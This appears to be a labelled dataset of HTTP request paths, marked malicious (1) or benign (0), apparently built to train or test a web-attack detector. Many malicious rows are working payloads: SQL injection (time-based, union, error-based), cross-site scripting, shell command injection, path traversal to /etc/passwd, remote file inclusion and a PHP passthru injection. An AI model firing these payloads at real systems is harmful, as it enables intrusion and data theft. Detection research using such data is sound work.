request	label
"/ string / strings / parameters = -6971 ""  ""  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ""  "" ifuh ""  ""  like  ""  "" ifuh "	1
/ steel pulse - rastanthology / 	0
"/ pxagj7n7 . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ scs86g1p . pl ?  < script > document . cookie =  "" testquyx = 2820 ;  ""  <  / script > "	1
"/ gvx7m5ti . php ?  < script > document . cookie =  "" testwldz = 3506 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 )  where 6090 = 6090 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- 	1
/ string / strings / parameters = 1 '  in boolean mode )  and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  # 	1
"/ top . php ? stuff =  ""  | ping ; -w ; 7000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ; "	1
/ javascript / lib . cc 	0
/ string / strings / parameters = 5399041434530750 	0
/ string / modo = registro & login = nettle & password = heir & nombre = rad & apellidos = zalarich + llufriu & email = duarte @ ingenieriadelaconstruccion . vc & dni = 47182191z & direccion = baza ,  + 55 ,  +  & ciudad = y / e +  + sa & cp = 43151 & provincia = granada & ntc = 8375962445368254 & b1 = registrar 	1
/ string / strings / parameters = 08tiro72 	0
/ help . php ? q =  '  \ x0ddel \ x09q24981853 \ x09 # 	1
/ bangkok babes-locket n '  chain  ( 2002 )  / 	1
/ sl-4975 / 	0
"/ zln2hm2z . php ?  < meta http-equiv = set-cookie content =  "" testblcp = 8120 ""  > "	1
/ dr-geo / 	0
/ string / modo = registro & login = simeon & password = cholgua & nombre = devota & apellidos = quinds + parini & email = dorsay @ ustream . cc & dni = 42892408f & direccion = felipe + olvera + s / n + 4 ? g & ciudad = caminomorisco & cp = 47319 & provincia = vila & ntc = 1611608298925836 & b1 = registrar 	0
/ yahoofinancewidget-tm / 	0
/ jgivens / 	0
/ string / strings / parameters = s ! oap 	0
/ javascript / checks . js 	0
/ string / modo = registro & login = s ?  ? u ? le & password = revistero & nombre = adelqui & apellidos = valente + sanchis & email = gargen @ 007tv . zw & dni = 83296238j & direccion = c /  + fuente + morena ,  + 146 ,  +  & ciudad = rillo & cp = 17752 & provincia = lleida & ntc = 3359754319393302 & b1 = registrar 	1
/ string / modo = registro & login = vetrie & password = 41t1lecti22 & nombre = amush & apellidos = trujillo + fornalino & email = benedict @ deltamarina . ve & dni = 95944263q & direccion = pl .  + santa + cruz ,  + 199 +  & ciudad = armaanzas & cp = 47173 & provincia = segovia & ntc = 6986967316168670 & b1 = registrar 	0
"/ 8x6w469u . html ?  < meta http-equiv = set-cookie content =  "" testgfjr = 1286 ""  > "	1
/ string / modo = registro & login = and + 1 = 1 & password = afrancesamiento & nombre = ada & apellidos = matar + iiguez & email = newfield . watase @ cortinasartesol . yu & dni = 75678701f & direccion = calle + sol + 188 + 9-h & ciudad = santo + domingo + de + la + calzada & cp = 45179 & provincia = albacete & ntc = 9167215819238112 & b1 = registrar 	1
/ javascript / doctype . lib 	0
"/ main . php ? logout =  "" ping -w 7000 -n 1 1 . 2 . 3 . 4 & rem "	1
/ main . php ? logout =  ; uname \ x09 > q14218261 \ x09 # 	1
/ javascript / declarations . png 	0
/ 5o9zq43e . htm ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = -8760 ""  ""  union all select 2309 , 2309 , 2309 , 2309 , 2309 , 2309 , 2309 , 2309 , 2309 # "	1
/ string / strings / parameters = d5sm7lad7 	0
/ bavarianpaintedlavenderporcelain / 	0
"/ hrttz9fj . cgi ?  < meta http-equiv = set-cookie content =  "" testtbjy = 7334 ""  > "	1
/ geeksonthego / 	0
/ jscript . php ? my_ms [ root ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ? 	1
/ cacti / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331905034 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ gyroballsmallicon / 	0
/ examples / jsp / colors / index . php ? module =  < script > foo <  / script > 	1
/ string / modo = insertar & precio = 688 & b1 = pasar + por + caja 	0
/ modules / links / showlinks . php ? language_home =  & rootdp = zzz & gslanguage = xxpathxx 	1
/ string / strings / parameters = | echo $ ifsimxnsu $  (  ( 31 + 19 )  )  $  ( echo $ ifsimxnsu ) imxnsu & 	1
"/ string / strings / parameters = 1 ""  ""  where 2131 = 2131 and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  -- "	1
/ sql-createtableas / 	0
/ scripts /  .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ string / strings / parameters = $  { passthru ( print (  ` echo rbchid `  .  ` echo  $  (  ( 71 + 83 )  )  `  .  ` echo rbchid `  .  ` echo rbchid `  )  ;  .  ' rbchid 	1
/ minolta / 	0
"/ string / modo = registro & login = vasiliad & password = tiqu73m77uis & nombre = virma & apellidos = catolino + florensa & email = ridges @ fotoseroticas . com . cx & dni = 67499126z < script > alert (  "" paros ""  )  ;  <  / script >  & direccion = plza .  + mayor ,  + 166 ,  +  & ciudad = camarias & cp = 26240 & provincia = almera & ntc = 4709387607686346 & b1 = registrar "	1
/ menulider / 	0
"/ string / strings / parameters = ""  |   [  2 -ne  $  ( echo juhlqp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 "	1
/ javascript / check . exe 	1
/ netword_summ / 	0
"/ zln2hm2z . fts ?  < script > document . cookie =  "" testblcp = 8120 ;  ""  <  / script > "	1
/ zuihld5m . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = narbo_nesa 	0
"/ main . php ? logout =  "" ver \ x0c > q35989384 & rem \ x0c "	1
/ string / strings / parameters = cister grandi 	0
/ string / modo = registro & login = cumming & password = 5alear & nombre = florencio & apellidos = any ?   set-cookie :  + tamper = 1041264011025374727 & email = bacskal_pavan @ smsgay . aw & dni = 67854500s & direccion = c /  + andres + muoz + perez ,  + 54 ,  +  & ciudad = huete & cp = 04838 & provincia = huelva & ntc = 6200992678316221 & b1 = registrar 	1
/ 3ds_max / 	0
/ string / strings / parameters = 15785527y 	0
/ archive_f / 	0
/ string / strings / parameters = maisonne 	0
"/ string / strings / parameters = 1 ""  ""  or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  ) "	1
"/ string / strings / parameters = ""  \  ""  \  /  >  < object data =  ' data : text / html ; base64 , phnjcmlwdd5hbgvydcgiehnziik8l3njcmlwdd4 =  '  >  <  / object >  "" "	1
/ recordings / story . pl ? next =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 where 3478 = 3478  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  -- 	1
/ javascript / web . java 	0
/ scripts / forum . php3 ? id_article = 1 & id_forum = -1 /  *  *  / union /  *  *  / select 2125564349 -- 	1
/ string / strings / parameters = -5585 '  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual ) 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as ikuz where 7385 = 7385 ; select sleep ( 5 )  # "	1
/ string / strings / parameters = 47620 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' scct '  where 2587 = 2587 and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  )  |  |  ' 	1
/ string / strings / parameters = ji1a 	0
/ upcomingconferences / 	0
/ javascript / privacy 	0
/ string / strings / parameters = '  , null , null , null , null , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   /  * 	1
/ searchliveauctions_112x17 / 	0
/ javascript / treasury . exe 	1
/ rubr_sonstiges / 	0
/ port_forwarding / 	0
/ mobot_l / 	0
/ fo564rei . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = '  ) print (  ` echo bwpfxw echo  $  (  ( 76 + 34 )  )  echo bwpfxw echo bwpfxw `  )  ; bwpfxw 	1
/ badboy / 	0
/ javascript / 14 . html 	0
/ string / id = 1 & nombre = queso + manchego & precio = 39 & cantidad = 0 & b1 = aadir + al + carrito 	0
/ a1144946 / 	0
/ string / strings / parameters = '  |   [  4 -ne  $  ( echo qptcde  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ cgi-bin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904365 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 	1
"/ 9kr0ih0v . dll ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
"/ en-us / dda2qr7j . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 164225 / 	0
/ string / strings / parameters = 1 '  +  ( select bgbq where 1589 = 1589 and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  )  +  ' 	1
"/ string / strings / parameters = 1 %  ""  ""  )  )  or 8514 = benchmark ( 5000000 , md5 ( 0x544d5a4c )  )  # "	1
/ temperaturereader / 	0
/ string / strings / parameters = almonacid de la sierra 	0
/ cgi-bin / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/  .  \  .  .  \  .  \  .  .  \  .  \  .  .  \  .  \  .  .  \  .  \  .  .  \  { file } 	1
/ string / strings / parameters = 34475 	0
/ 327241 / 	0
/ string / strings / parameters = marling 	0
/ string / modo = insertar & precio = 5756 & b1 = pasar + por + caja 	0
/ string / strings / parameters = de_souza 	0
"/ vwmg565s . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 1 '  )  ; select count (  *  )  from generate_series ( 1 , 5000000 ) 	1
/ string / id = 1 & nombre = queso + manchego & precio = 39 & cantidad = 52 & b1 = aadir + al + carrito 	0
"/ string / strings / parameters = < div style =  "" background-image :  url (  &  # 1 ; javascript : alert (  ' xss '  )  )  ""  > "	1
/ freeforums / 	0
"/ 1r8cfrlf . kspx ?  < meta http-equiv = set-cookie content =  "" testydan = 5106 ""  > "	1
/ javascript / digest . vbs 	0
/ javascript / notifications . core 	0
"/ string / strings / parameters = 1 ""  ""  and 7533 = 7533 "	1
"/ string / strings / parameters = < a style =  "" behavior : url (  # default # anchorclick )  ;  ""  folder =  "" javascript : alert ( 1 )  ""  > xxx <  / a > "	1
"/ string / strings / parameters = ; echo lbkhxk $  (  ( 90 + 74 )  )  $  ( echo lbkhxk ) lbkhxk "" "	1
/ scripts / pmwiki . php ? globals [ farmd ]  =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1    union    select    abc    from    abc 	1
/ string / strings / parameters = tenna1 	0
/ calendario / cal_insert . php ? classpath = xxpathxx 	1
"/ string / strings / parameters = 1 ""  ""  where 7380 = 7380 or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- "	1
/ examples / jsp / sessions / sgdynamo . exe ? htname = sgdynamo . exe 	1
/ esmozg5d . idc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ installxp / 	0
/ string / strings / parameters = 1 )  )  or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  and  (  ( 8554 = 8554 	1
/ cgi-bin / fileseek . cgi ? head =  & foot =  ; cat  / etc / passwd 	1
/ string / strings / parameters = 1 '  ; select  ( case when  ( 1412 = 5313 )  then 1412 else 1412 *  ( select 1412 from mysql . db )  end )  # 	1
/ string / modo = insertar & precio = 8792 & b1 = confirmar / 	1
/ hackerinfo / 	0
/ e9rx3ya4 . asp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / priv . ws 	0
/ string / strings / parameters = 7387 	0
/ res_info2 / 	0
/ string / strings / parameters = 1 %  '  )  )  ; if ( 7899 = 7899 )  select 7899 else drop function zbbp -- 	1
/ string / strings / parameters = echo $ ifsovtgks $  (  ( 3 + 77 )  )  $  ( echo $ ifsovtgks ) ovtgks /  / 	1
/ 20030305-21 / 	0
/ string / strings / parameters = choon-li 	0
/ string / strings / parameters = 85125612j 	0
/ 1165685748158 / 	0
/ scripts / wspd_cgi . sh / wservice = wsbroker1 / webutil / ping . p 	1
/ string / strings / parameters = 1 %  '  )  union all select null , null # 	1
/ p2p . meta 	0
/ string / strings / parameters = onomstico 	0
/ string / strings / parameters = masahiro 	0
/ string / strings / parameters = 357rte0o 	0
/ string / strings / parameters = 1 )  )  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- 	1
/ examples / jsp / jsp2 / jspx / help / index . php ? help_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ 1991325icownersmanual / 	0
/ 3647776 / 	0
/ static /  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / windows / win . ini 	1
/ javascript / helpers . meta 	0
/ string / strings / parameters = echo $ ifspdgowg $  (  ( 0 + 24 )  )  $  ( echo $ ifspdgowg ) pdgowg /  / 	1
/ string / strings / parameters = decour raichs 	0
/ splash1_1 / 	0
/ javascript / null . trace 	0
/ javascript / id . php3 	0
/ starter-banshee / 	0
/ string / modo = registro & login = gib & password = 3l29stre ' or ' a =  ' a & nombre = yarav & apellidos = paella + villasev & email = switzer @ grandesinventos . pt & dni = 04831932t & direccion = c /  + rio + san + lorenzo ,  + 125 ,  + 10 ? c & ciudad = alegra-dulantzi & cp = 34170 & provincia = zamora & ntc = 3029147558638309 & b1 = registrar 	1
/ a screensaver creator v3 / 	0
/ string / strings / parameters = rudisill8 	0
/ string / modo = registro & login = benjavan & password = mantateri . lla & nombre = barcario & apellidos = estades + orizales & email = shaughnessy @ white-pearl-resort . nf & dni = 53933880f & direccion = o + rio ,  + 134 ,  +  & ciudad = elorrio & cp = 02247 & provincia = navarra & ntc = 1022652655889356 & b1 = registrar 	0
/ d25414405eb37dae1c14b18d6a2cac34 / 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' vpuh '  where 8164 = 8164 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  )  |  |  ' 	1
/ string / strings / parameters = -7273 %  '  )  )  order by 1 # 	1
/ examples / jsp / num / supporter / tupdate . php ? groupid = change & sg =  ' 	1
/ string / modo = insertar & precio = 2511 & b1 = pasar + por + caja / 	1
/  < script > cross_site_scripting . nasl <  / script >  . php3 	1
/ megabook / admin . cgi ? login =  < script > alert (  ' vulnerable '  )  <  / script > 	1
/ outabout / 	0
/ javascript / docs . exe 	1
/ 000097544 / 	0
/ php_off / 	0
/ javascript / soap . tar . bz2 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' fdkl '  where 4572 = 4572 union all select null , null , null , null , null , null , null , null , null # 	1
/ string / id = 2 & nombre = vino + rioja & precio = 100 /  & cantidad = 72 & b1 = aadir + al + carrito 	1
/ examples / jsp / cal / mapserv . exe ? map = mapserver_detect . nasl . map 	1
/ webmail / includes / mailaccess / pop3 / core . php ? config [ pear_dir ]  = xxpathxx 	1
/ top . php ? stuff =  '  \ x0ddel \ x09q15742122 \ x09 # 	1
/ phpmyadmin / sawmill6cl . exe ? ho +  { complete_version } 	1
/ string / modo = registro & login = rosita & password = 4i7sp375 & nombre = shannen & apellidos = guaita + zaragoza & email = philips @ davidymamen . sa & dni = 42231079c & direccion = fuenmayor ,  + 130 ,  +  & ciudad = lantarn & cp = 05164 & provincia = huesca & ntc = 2106115502546760 & b1 = registrar 	0
/ 137902 / 	0
/ string / strings / parameters = tajahuerce 	0
/ string / strings / parameters = pg_delay ( 50 ) 	1
/ anch_longhorn / 	0
"/ qb2xy9aw . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo xdaibc )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
"/ o1zj4u9v . fts ?  < script > document . cookie =  "" testabrn = 6368 ;  ""  <  / script > "	1
/ kcrw_logo / 	0
/ string / modo = insertar & precio = 9089 & b1 = confirmar / 	1
/ string / strings / parameters = ftp :  /  / 192 . 168 . 27 . 103 /  *  < apache_mod_proxy_ftp_glob_xss . nasl > 	1
/ upload . php ? save_path = xxpathxx ? 	1
/ string / strings / parameters = carrique orri 	0
"/ zln2hm2z . idc ?  < script > document . cookie =  "" testblcp = 8120 ;  ""  <  / script > "	1
/ 191481633wigswv_th / 	0
/ scripts / www / delivery / ac . php ? bannerid = -1331919146 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_tuezckvg ]  )  )  ; die ;  /  * 	1
"/ 7uz3ok60 . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ bitplayer / 	0
/ string / strings / parameters = tebete ,  s / n ,  8 ? d 	0
/ string / strings / parameters = calle arins 87 4 ? e 	0
/ string / strings / parameters = hsien 	0
/ 139106 / 	0
/ string / strings / parameters = |   [  3 -ne  $  ( echo izdfyz  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  # 	1
/ string / strings / parameters = ;  str =  $  ( echo wszrir )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 24 . 202 / top . php ? stuff = 1583574484 & frm_user = q52428412 & scr_height =  & scr_width = 	1
/ string / strings / parameters = &  & echo xvksqg $  (  ( 73 + 31 )  )  $  ( echo xvksqg ) xvksqg & 	1
/ examples / jsp / colors / viewpage . php ? file =  / etc / passwd 	1
/ string / strings / parameters = '   str =  $  ( echo zsgsgj )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ string / strings / parameters = anguciana 	0
/ string / modo = entrar & login = linnet & pwd = co ' ngrega / ci , n & remember = off & b1 = entrar 	1
/ access / login . php ? path_to_root = xxpathxx 	1
/ finsearch / 	0
/ 205-ronan / 	0
/ lib / header . php ? doc_root = xxpathxx 	1
